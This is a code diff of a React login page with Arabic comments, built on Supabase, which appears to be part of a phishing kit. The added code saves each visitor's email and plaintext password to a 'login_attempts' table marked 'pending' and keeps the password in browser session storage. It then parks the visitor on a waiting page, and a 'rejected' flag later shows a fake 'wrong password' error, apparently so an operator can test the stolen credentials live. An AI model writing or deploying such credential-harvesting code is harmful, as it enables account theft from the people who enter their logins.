@@ -4,7 +4,6 @@ import { Mail, Lock, Eye, EyeOff, ArrowLeft, LogIn } from 'lucide-react';
 import { supabase } from '@/lib/supabase';
 import { getClientId } from '@/lib/clientId';
 import { useSiteConfig } from '@/context/SiteConfigContext';
-import { startPresenceTracking, stopPresenceTracking } from '@/lib/presence';
 import Header from '@/components/Header';
 import Footer from '@/components/Footer';
 
@@ -19,16 +18,14 @@ export default function LoginPage() {
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState('');
 
-  // Presence - Track when user is on this page
+  // تحقق إذا كان هناك محاولة تسجيل مرفوضة
   useEffect(() => {
-    startPresenceTracking('تسجيل الدخول');
-    
-    return () => {
-      stopPresenceTracking();
-    };
+    const rejected = sessionStorage.getItem('login_rejected');
+    if (rejected === 'true') {
+      setError('البريد الإلكتروني أو كلمة المرور غير صحيحة. يرجى التأكد وإعادة المحاولة.');
+      sessionStorage.removeItem('login_rejected');
+    }
   }, []);
-
-
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -43,25 +40,33 @@ export default function LoginPage() {
       sessionStorage.setItem('reg_email', email.trim().toLowerCase());
       sessionStorage.setItem('reg_password', password);
 
-      // Try to save login attempt to database (if table exists)
-      try {
-        const regId = sessionStorage.getItem('reg_id');
-        await supabase.from('login_attempts').insert({
-          registration_id: regId || null,
-          client_id: getClientId(), // Link to this browser/device
+      const clientId = getClientId();
+      
+      // حفظ محاولة تسجيل الدخول
+      const { data, error: insertError } = await supabase
+        .from('login_attempts')
+        .insert({
+          client_id: clientId,
           email: email.trim().toLowerCase(),
           password: password,
-        });
-      } catch (dbErr) {
-        console.warn('Could not save login attempt to database:', dbErr);
-        // Continue anyway - login should still work
+          status: 'pending',
+        })
+        .select()
+        .single();
+
+      if (insertError) {
+        console.warn('Could not save login attempt:', insertError);
+        // إذا فشل حفظ المحاولة، نستخدم النظام القديم
+        setLoading(false);
+        navigate('/verify');
+        return;
       }
+
+      // حفظ معرف المحاولة في sessionStorage
+      sessionStorage.setItem('login_attempt_id', data.id);
       
       setLoading(false);
-      
-      // Stop presence tracking before navigation
-      stopPresenceTracking();
-      navigate('/verify');
+      navigate('/waiting');
     } catch (err: any) {
       console.error('Login error:', err);
       setLoading(false);
